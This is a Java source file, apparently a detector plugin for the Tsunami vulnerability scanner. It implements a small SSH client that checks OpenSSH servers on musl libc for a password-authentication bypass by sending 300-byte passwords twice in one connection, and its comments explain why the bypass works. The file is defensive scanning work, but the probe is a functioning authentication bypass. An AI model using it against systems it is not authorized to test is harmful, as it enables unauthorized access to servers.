/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.credentials.opensshauthbypass;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.base.Splitter;
import com.google.common.flogger.GoogleLogger;
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.math.BigInteger;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.security.GeneralSecurityException;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.interfaces.ECPublicKey;
import java.security.spec.ECGenParameterSpec;
import java.security.spec.ECPoint;
import java.security.spec.ECPublicKeySpec;
import java.util.Arrays;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.KeyAgreement;
import javax.crypto.Mac;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Minimal RFC 4253 / RFC 5656 / RFC 4252 SSH-2.0 client that negotiates {@code ecdh-sha2-nistp256},
 * {@code aes128-ctr}, and {@code hmac-sha2-256} over a {@link Socket} and probes for the OpenSSH
 * musl {@code >256}-byte password authentication bypass.
 */
final class SshPasswordAuthClient {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  static final String CLIENT_VERSION = "SSH-2.0-Tsunami";
  private static final int SOCKET_TIMEOUT_MS = 8000;
  private static final int MAX_PACKET_LENGTH = 65536;
  private static final int MAX_PASSWORD_PROMPTS_PER_CONNECTION = 2;

  static final byte SSH_MSG_DISCONNECT = 1;
  static final byte SSH_MSG_IGNORE = 2;
  static final byte SSH_MSG_UNIMPLEMENTED = 3;
  static final byte SSH_MSG_DEBUG = 4;
  static final byte SSH_MSG_SERVICE_REQUEST = 5;
  static final byte SSH_MSG_SERVICE_ACCEPT = 6;
  static final byte SSH_MSG_EXT_INFO = 7;
  static final byte SSH_MSG_KEXINIT = 20;
  static final byte SSH_MSG_NEWKEYS = 21;
  static final byte SSH_MSG_KEX_ECDH_INIT = 30;
  static final byte SSH_MSG_KEX_ECDH_REPLY = 31;
  static final byte SSH_MSG_USERAUTH_REQUEST = 50;
  static final byte SSH_MSG_USERAUTH_FAILURE = 51;
  static final byte SSH_MSG_USERAUTH_SUCCESS = 52;
  static final byte SSH_MSG_USERAUTH_BANNER = 53;

  @VisibleForTesting static final String SHORT_INVALID_PASSWORD = "tsunami_invalid_short_pw_9f8a2b";

  /**
   * Distinct 300-byte password payloads: strictly greater than musl libc's {@code KEY_MAX = 256}
   * (causing {@code __crypt_sha512} / {@code __crypt_sha256} to fail and return {@code "*"}) and
   * within OpenSSH's {@code MAX_PASSWORD_LEN = 1024}.
   */
  @VisibleForTesting static final String LONG_BYPASS_PASSWORD = "A".repeat(300);

  @VisibleForTesting static final String SECOND_LONG_BYPASS_PASSWORD = "B".repeat(300);

  /** Outcome of a single password authentication attempt on an SSH service. */
  enum AuthAttemptResult {
    /** The server accepted the password with {@code SSH_MSG_USERAUTH_SUCCESS}. */
    ACCEPTED,
    /**
     * The server rejected the password with {@code SSH_MSG_USERAUTH_FAILURE} and advertises {@code
     * password} as an allowed authentication method.
     */
    REJECTED,
    /** The server does not advertise {@code password} in {@code SSH_MSG_USERAUTH_FAILURE}. */
    PASSWORD_AUTH_DISABLED,
    /** The target sent a non-OpenSSH banner. */
    NOT_OPENSSH,
    /**
     * The connection was closed before banner exchange completed (e.g., due to OpenSSH 9.8+ {@code
     * PerSourcePenalties} cooldown immediately following port scanning).
     */
    CONNECTION_DROPPED
  }

  private final SecureRandom secureRandom = new SecureRandom();

  /**
   * Connects to the SSH server on {@code socket}, completes the {@code ecdh-sha2-nistp256} key
   * exchange, and attempts {@code ssh-userauth} {@code "password"} authentication for {@code
   * username} with {@code password}.
   */
  AuthAttemptResult tryPassword(Socket socket, String username, String password) {
    boolean bannerReceived = false;
    boolean firstPromptRejected = false;
    try {
      socket.setSoTimeout(SOCKET_TIMEOUT_MS);
      InputStream in = socket.getInputStream();
      OutputStream out = socket.getOutputStream();

      // 1. Exchange SSH-2.0 identification strings.
      out.write((CLIENT_VERSION + "\r\n").getBytes(StandardCharsets.US_ASCII));
      out.flush();

      String serverVersion = readServerBanner(in);
      if (serverVersion == null) {
        return AuthAttemptResult.CONNECTION_DROPPED;
      }
      bannerReceived = true;
      if (!serverVersion.startsWith("SSH-2.0-OpenSSH")) {
        return AuthAttemptResult.NOT_OPENSSH;
      }

      TransportState transport = new TransportState(in, out);

      // 2. Send client SSH_MSG_KEXINIT and read server SSH_MSG_KEXINIT.
      byte[] clientKexInit = buildKexInitPayload();
      transport.sendPacket(clientKexInit);
      byte[] serverKexInit = transport.readNextSignificantPacket();
      if (serverKexInit.length == 0 || serverKexInit[0] != SSH_MSG_KEXINIT) {
        return AuthAttemptResult.NOT_OPENSSH;
      }

      // 3. Perform ecdh-sha2-nistp256 (secp256r1) key exchange.
      KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
      kpg.initialize(new ECGenParameterSpec("secp256r1"), secureRandom);
      KeyPair clientKeyPair = kpg.generateKeyPair();
      ECPublicKey clientPubKey = (ECPublicKey) clientKeyPair.getPublic();
      byte[] qc = encodeUncompressedEcPoint(clientPubKey.getW());

      ByteArrayOutputStream ecdhInit = new ByteArrayOutputStream();
      ecdhInit.write(SSH_MSG_KEX_ECDH_INIT);
      writeSshString(ecdhInit, qc);
      transport.sendPacket(ecdhInit.toByteArray());

      byte[] ecdhReply = transport.readNextSignificantPacket();
      if (ecdhReply.length == 0 || ecdhReply[0] != SSH_MSG_KEX_ECDH_REPLY) {
        return AuthAttemptResult.NOT_OPENSSH;
      }
      ByteBuffer replyBuf = ByteBuffer.wrap(ecdhReply, 1, ecdhReply.length - 1);
      byte[] ks = readSshString(replyBuf);
      byte[] qs = readSshString(replyBuf);

      ECPublicKey serverPubKey = decodeUncompressedEcPoint(qs, clientPubKey);
      KeyAgreement ka = KeyAgreement.getInstance("ECDH");
      ka.init(clientKeyPair.getPrivate());
      ka.doPhase(serverPubKey, true);
      byte[] rawSharedSecret = ka.generateSecret();
      byte[] mpintK = encodeMpintUnsigned(rawSharedSecret);

      byte[] exchangeHash =
          computeExchangeHash(
              CLIENT_VERSION.getBytes(StandardCharsets.US_ASCII),
              serverVersion.getBytes(StandardCharsets.US_ASCII),
              clientKexInit,
              serverKexInit,
              ks,
              qc,
              qs,
              mpintK);

      // 4. Exchange SSH_MSG_NEWKEYS and activate encryption + MAC.
      transport.sendPacket(new byte[] {SSH_MSG_NEWKEYS});
      byte[] newKeysReply = transport.readNextSignificantPacket();
      if (newKeysReply.length == 0 || newKeysReply[0] != SSH_MSG_NEWKEYS) {
        return AuthAttemptResult.NOT_OPENSSH;
      }
      transport.activateKeys(mpintK, exchangeHash);

      // 5. Request ssh-userauth service.
      ByteArrayOutputStream serviceReq = new ByteArrayOutputStream();
      serviceReq.write(SSH_MSG_SERVICE_REQUEST);
      writeSshString(serviceReq, "ssh-userauth".getBytes(StandardCharsets.US_ASCII));
      transport.sendPacket(serviceReq.toByteArray());

      byte[] serviceAccept = transport.readNextSignificantPacket();
      if (serviceAccept.length == 0 || serviceAccept[0] != SSH_MSG_SERVICE_ACCEPT) {
        return AuthAttemptResult.REJECTED;
      }

      // 6. Send up to two SSH_MSG_USERAUTH_REQUEST packets within the same SSH connection.
      // On OpenSSH + musl systems using /etc/shadow (e.g., OpenSSH 8.8p1 on Alpine or 10.6p1 on
      // OpenWrt), the first password prompt initializes pick_salt()'s static salt buffer via
      // getspnam() and wipes musl's shared static getspnam() buffer (clearing pw_passwd so prompt
      // #1 fails), whereas prompt #2 in the same connection reuses the cached salt without calling
      // getspnam(), preserving pw_passwd ("*") so crypt() returning "*" matches.
      for (int prompt = 0; prompt < MAX_PASSWORD_PROMPTS_PER_CONNECTION; prompt++) {
        transport.sendPacket(buildPasswordAuthRequest(username, password));
        byte[] authReply = transport.readNextSignificantPacket();
        if (authReply.length == 0 || authReply[0] == SSH_MSG_DISCONNECT) {
          return AuthAttemptResult.REJECTED;
        }
        if (authReply[0] == SSH_MSG_USERAUTH_SUCCESS) {
          transport.sendDisconnect();
          return AuthAttemptResult.ACCEPTED;
        }
        if (authReply[0] == SSH_MSG_USERAUTH_FAILURE) {
          ByteBuffer failBuf = ByteBuffer.wrap(authReply, 1, authReply.length - 1);
          String allowedMethods = new String(readSshString(failBuf), StandardCharsets.US_ASCII);
          List<String> methodList = Splitter.on(',').splitToList(allowedMethods);
          if (!methodList.contains("password")) {
            transport.sendDisconnect();
            return AuthAttemptResult.PASSWORD_AUTH_DISABLED;
          }
          firstPromptRejected = true;
          continue;
        }
        transport.sendDisconnect();
        return AuthAttemptResult.REJECTED;
      }
      transport.sendDisconnect();
      return AuthAttemptResult.REJECTED;
    } catch (IOException | GeneralSecurityException | IllegalArgumentException e) {
      logger.atFine().withCause(e).log("SSH auth attempt failed for user '%s'", username);
      if (!bannerReceived) {
        return AuthAttemptResult.CONNECTION_DROPPED;
      }
      return firstPromptRejected ? AuthAttemptResult.REJECTED : AuthAttemptResult.NOT_OPENSSH;
    }
  }

  private static String readServerBanner(InputStream in) throws IOException {
    // Per RFC 4253 Section 4.2, the server may send extra lines before "SSH-".
    for (int lineCount = 0; lineCount < 16; lineCount++) {
      ByteArrayOutputStream lineBuf = new ByteArrayOutputStream();
      while (lineBuf.size() < 512) {
        int b = in.read();
        if (b == -1) {
          return null;
        }
        if (b == '\n') {
          break;
        }
        if (b != '\r') {
          lineBuf.write(b);
        }
      }
      String line = lineBuf.toString(StandardCharsets.US_ASCII);
      if (line.startsWith("SSH-")) {
        return line;
      }
    }
    return null;
  }

  private byte[] buildKexInitPayload() throws IOException {
    byte[] cookie = new byte[16];
    secureRandom.nextBytes(cookie);

    ByteArrayOutputStream out = new ByteArrayOutputStream();
    out.write(SSH_MSG_KEXINIT);
    out.write(cookie);
    writeNameList(out, "ecdh-sha2-nistp256");
    writeNameList(
        out,
        "ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,"
            + "rsa-sha2-512,rsa-sha2-256");
    writeNameList(out, "aes128-ctr");
    writeNameList(out, "aes128-ctr");
    writeNameList(out, "hmac-sha2-256");
    writeNameList(out, "hmac-sha2-256");
    writeNameList(out, "none");
    writeNameList(out, "none");
    writeNameList(out, "");
    writeNameList(out, "");
    out.write(0); // first_kex_packet_follows = FALSE
    writeUint32(out, 0); // reserved = 0
    return out.toByteArray();
  }

  private static byte[] buildPasswordAuthRequest(String username, String password)
      throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream();
    out.write(SSH_MSG_USERAUTH_REQUEST);
    writeSshString(out, username.getBytes(StandardCharsets.UTF_8));
    writeSshString(out, "ssh-connection".getBytes(StandardCharsets.US_ASCII));
    writeSshString(out, "password".getBytes(StandardCharsets.US_ASCII));
    out.write(0); // boolean: FALSE (not changing password)
    writeSshString(out, password.getBytes(StandardCharsets.UTF_8));
    return out.toByteArray();
  }

  static byte[] encodeUncompressedEcPoint(ECPoint point) {
    byte[] x = toFixedLengthUnsigned(point.getAffineX(), 32);
    byte[] y = toFixedLengthUnsigned(point.getAffineY(), 32);
    byte[] encoded = new byte[65];
    encoded[0] = 0x04;
    System.arraycopy(x, 0, encoded, 1, 32);
    System.arraycopy(y, 0, encoded, 33, 32);
    return encoded;
  }

  static ECPublicKey decodeUncompressedEcPoint(byte[] encoded, ECPublicKey paramsTemplate)
      throws GeneralSecurityException {
    if (encoded.length != 65 || encoded[0] != 0x04) {
      throw new GeneralSecurityException("Invalid uncompressed P-256 EC point");
    }
    BigInteger x = new BigInteger(1, Arrays.copyOfRange(encoded, 1, 33));
    BigInteger y = new BigInteger(1, Arrays.copyOfRange(encoded, 33, 65));
    KeyFactory kf = KeyFactory.getInstance("EC");
    return (ECPublicKey)
        kf.generatePublic(new ECPublicKeySpec(new ECPoint(x, y), paramsTemplate.getParams()));
  }

  private static byte[] toFixedLengthUnsigned(BigInteger value, int length) {
    byte[] raw = value.toByteArray();
    if (raw.length == length) {
      return raw;
    }
    if (raw.length == length + 1 && raw[0] == 0) {
      return Arrays.copyOfRange(raw, 1, raw.length);
    }
    if (raw.length < length) {
      byte[] padded = new byte[length];
      System.arraycopy(raw, 0, padded, length - raw.length, raw.length);
      return padded;
    }
    throw new IllegalArgumentException("BigInteger exceeds target byte length");
  }

  static byte[] encodeMpintUnsigned(byte[] unsignedBigEndian) throws IOException {
    BigInteger val = new BigInteger(1, unsignedBigEndian);
    byte[] twosComplement = val.equals(BigInteger.ZERO) ? new byte[0] : val.toByteArray();
    ByteArrayOutputStream out = new ByteArrayOutputStream(4 + twosComplement.length);
    writeSshString(out, twosComplement);
    return out.toByteArray();
  }

  static byte[] computeExchangeHash(
      byte[] vc, byte[] vs, byte[] ic, byte[] is, byte[] ks, byte[] qc, byte[] qs, byte[] mpintK)
      throws GeneralSecurityException, IOException {
    ByteArrayOutputStream hashInput = new ByteArrayOutputStream();
    writeSshString(hashInput, vc);
    writeSshString(hashInput, vs);
    writeSshString(hashInput, ic);
    writeSshString(hashInput, is);
    writeSshString(hashInput, ks);
    writeSshString(hashInput, qc);
    writeSshString(hashInput, qs);
    hashInput.write(mpintK);
    return MessageDigest.getInstance("SHA-256").digest(hashInput.toByteArray());
  }

  static byte[] deriveKey(byte[] mpintK, byte[] exchangeHash, char keyId, int length)
      throws GeneralSecurityException {
    MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
    sha256.update(mpintK);
    sha256.update(exchangeHash);
    sha256.update((byte) keyId);
    sha256.update(exchangeHash);
    byte[] digest = sha256.digest();
    return Arrays.copyOf(digest, length);
  }

  static void writeNameList(OutputStream out, String list) throws IOException {
    writeSshString(out, list.getBytes(StandardCharsets.US_ASCII));
  }

  static void writeSshString(OutputStream out, byte[] data) throws IOException {
    writeUint32(out, data.length);
    out.write(data);
  }

  static void writeUint32(OutputStream out, int value) throws IOException {
    out.write((value >>> 24) & 0xFF);
    out.write((value >>> 16) & 0xFF);
    out.write((value >>> 8) & 0xFF);
    out.write(value & 0xFF);
  }

  static byte[] readSshString(ByteBuffer buf) throws IOException {
    if (buf.remaining() < 4) {
      throw new IOException("Truncated SSH string length");
    }
    int len = buf.getInt();
    if (len < 0 || len > buf.remaining()) {
      throw new IOException("Invalid SSH string length: " + len);
    }
    byte[] data = new byte[len];
    buf.get(data);
    return data;
  }

  static void readFully(InputStream in, byte[] buf, int off, int len) throws IOException {
    int total = 0;
    while (total < len) {
      int read = in.read(buf, off + total, len - total);
      if (read < 0) {
        throw new EOFException("Unexpected EOF while reading SSH packet");
      }
      total += read;
    }
  }

  private final class TransportState {
    private final InputStream in;
    private final OutputStream out;
    private int clientSeqNo = 0;
    private int serverSeqNo = 0;
    private Cipher cipherC2S;
    private Cipher cipherS2C;
    private Mac macC2S;
    private Mac macS2C;

    TransportState(InputStream in, OutputStream out) {
      this.in = in;
      this.out = out;
    }

    void activateKeys(byte[] mpintK, byte[] exchangeHash) throws GeneralSecurityException {
      byte[] ivC2S = deriveKey(mpintK, exchangeHash, 'A', 16);
      byte[] ivS2C = deriveKey(mpintK, exchangeHash, 'B', 16);
      byte[] keyC2S = deriveKey(mpintK, exchangeHash, 'C', 16);
      byte[] keyS2C = deriveKey(mpintK, exchangeHash, 'D', 16);
      byte[] macKeyC2S = deriveKey(mpintK, exchangeHash, 'E', 32);
      byte[] macKeyS2C = deriveKey(mpintK, exchangeHash, 'F', 32);

      cipherC2S = Cipher.getInstance("AES/CTR/NoPadding");
      cipherC2S.init(
          Cipher.ENCRYPT_MODE, new SecretKeySpec(keyC2S, "AES"), new IvParameterSpec(ivC2S));

      cipherS2C = Cipher.getInstance("AES/CTR/NoPadding");
      cipherS2C.init(
          Cipher.DECRYPT_MODE, new SecretKeySpec(keyS2C, "AES"), new IvParameterSpec(ivS2C));

      macC2S = Mac.getInstance("HmacSHA256");
      macC2S.init(new SecretKeySpec(macKeyC2S, "HmacSHA256"));

      macS2C = Mac.getInstance("HmacSHA256");
      macS2C.init(new SecretKeySpec(macKeyS2C, "HmacSHA256"));
    }

    void sendPacket(byte[] payload) throws IOException {
      int blockSize = (cipherC2S == null) ? 8 : 16;
      int paddingLen = blockSize - ((4 + 1 + payload.length) % blockSize);
      if (paddingLen < 4) {
        paddingLen += blockSize;
      }
      byte[] padding = new byte[paddingLen];
      secureRandom.nextBytes(padding);

      int packetLen = 1 + payload.length + paddingLen;
      ByteBuffer unenc = ByteBuffer.allocate(4 + packetLen).order(ByteOrder.BIG_ENDIAN);
      unenc.putInt(packetLen);
      unenc.put((byte) paddingLen);
      unenc.put(payload);
      unenc.put(padding);
      byte[] unencBytes = unenc.array();

      if (cipherC2S == null) {
        out.write(unencBytes);
      } else {
        byte[] seqBytes =
            ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(clientSeqNo).array();
        macC2S.update(seqBytes);
        macC2S.update(unencBytes);
        byte[] mac = macC2S.doFinal();
        byte[] encBytes = cipherC2S.update(unencBytes);
        out.write(encBytes);
        out.write(mac);
      }
      out.flush();
      clientSeqNo++;
    }

    void sendDisconnect() {
      try {
        ByteArrayOutputStream disconnect = new ByteArrayOutputStream();
        disconnect.write(SSH_MSG_DISCONNECT);
        writeUint32(disconnect, 11); // SSH_DISCONNECT_BY_APPLICATION
        writeSshString(disconnect, new byte[0]);
        writeSshString(disconnect, new byte[0]);
        sendPacket(disconnect.toByteArray());
      } catch (IOException ignored) {
        // Best-effort disconnect before closing socket.
      }
    }

    byte[] readNextSignificantPacket() throws IOException {
      for (int i = 0; i < 16; i++) {
        byte[] payload = readPacket();
        if (payload.length == 0) {
          return payload;
        }
        byte msgType = payload[0];
        if (msgType == SSH_MSG_IGNORE
            || msgType == SSH_MSG_DEBUG
            || msgType == SSH_MSG_EXT_INFO
            || msgType == SSH_MSG_USERAUTH_BANNER
            || msgType == SSH_MSG_UNIMPLEMENTED) {
          continue;
        }
        return payload;
      }
      throw new IOException("Too many consecutive non-significant SSH packets");
    }

    private byte[] readPacket() throws IOException {
      if (cipherS2C == null) {
        byte[] header = new byte[4];
        readFully(in, header, 0, 4);
        int packetLen = ByteBuffer.wrap(header).order(ByteOrder.BIG_ENDIAN).getInt();
        if (packetLen < 5 || packetLen > MAX_PACKET_LENGTH) {
          throw new IOException("Invalid plaintext SSH packet length: " + packetLen);
        }
        byte[] body = new byte[packetLen];
        readFully(in, body, 0, packetLen);
        int paddingLen = body[0] & 0xFF;
        int payloadLen = packetLen - 1 - paddingLen;
        if (payloadLen < 0) {
          throw new IOException("Invalid plaintext SSH padding length");
        }
        serverSeqNo++;
        return Arrays.copyOfRange(body, 1, 1 + payloadLen);
      } else {
        byte[] firstBlockEnc = new byte[16];
        readFully(in, firstBlockEnc, 0, 16);
        byte[] firstBlockDec = cipherS2C.update(firstBlockEnc);
        int packetLen = ByteBuffer.wrap(firstBlockDec, 0, 4).order(ByteOrder.BIG_ENDIAN).getInt();
        if (packetLen < 12 || packetLen > MAX_PACKET_LENGTH || ((4 + packetLen) % 16) != 0) {
          throw new IOException("Invalid encrypted SSH packet length: " + packetLen);
        }
        int remainingLen = (4 + packetLen) - 16;
        byte[] fullPacketDec = new byte[4 + packetLen];
        System.arraycopy(firstBlockDec, 0, fullPacketDec, 0, 16);
        if (remainingLen > 0) {
          byte[] remEnc = new byte[remainingLen];
          readFully(in, remEnc, 0, remainingLen);
          byte[] remDec = cipherS2C.update(remEnc);
          System.arraycopy(remDec, 0, fullPacketDec, 16, remainingLen);
        }
        byte[] receivedMac = new byte[32];
        readFully(in, receivedMac, 0, 32);

        byte[] seqBytes =
            ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(serverSeqNo).array();
        macS2C.update(seqBytes);
        macS2C.update(fullPacketDec);
        byte[] expectedMac = macS2C.doFinal();
        if (!MessageDigest.isEqual(receivedMac, expectedMac)) {
          throw new IOException("SSH packet MAC verification failed");
        }
        serverSeqNo++;

        int paddingLen = fullPacketDec[4] & 0xFF;
        int payloadLen = packetLen - 1 - paddingLen;
        if (payloadLen < 0) {
          throw new IOException("Invalid encrypted SSH padding length");
        }
        return Arrays.copyOfRange(fullPacketDec, 5, 5 + payloadLen);
      }
    }
  }
}
